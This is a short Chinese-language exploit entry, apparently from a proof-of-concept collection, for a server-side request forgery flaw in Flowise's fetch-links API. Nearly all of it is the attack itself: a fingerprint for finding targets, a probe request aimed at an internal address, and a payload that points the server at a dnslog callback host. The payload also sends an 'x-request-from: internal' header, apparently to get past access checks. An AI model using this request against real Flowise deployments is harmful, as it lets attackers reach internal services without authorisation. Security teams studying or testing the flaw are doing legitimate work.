# Flowisefetch-links存在SSRF漏洞

Flowisefetch ｜ SSRF ｜ —
- **指纹**：`title="Flowise"`
- **请求**：`GET /api/v1/fetch-links?url=http%3A%2F%2F127.0.0.1:8080%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1`

**Payload**
```
GET /api/v1/fetch-links?url=http%3A%2F%2F333.2jlb9x.dnslog.cn%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
Host:
x-request-from: internal
```
- **响应特征**：200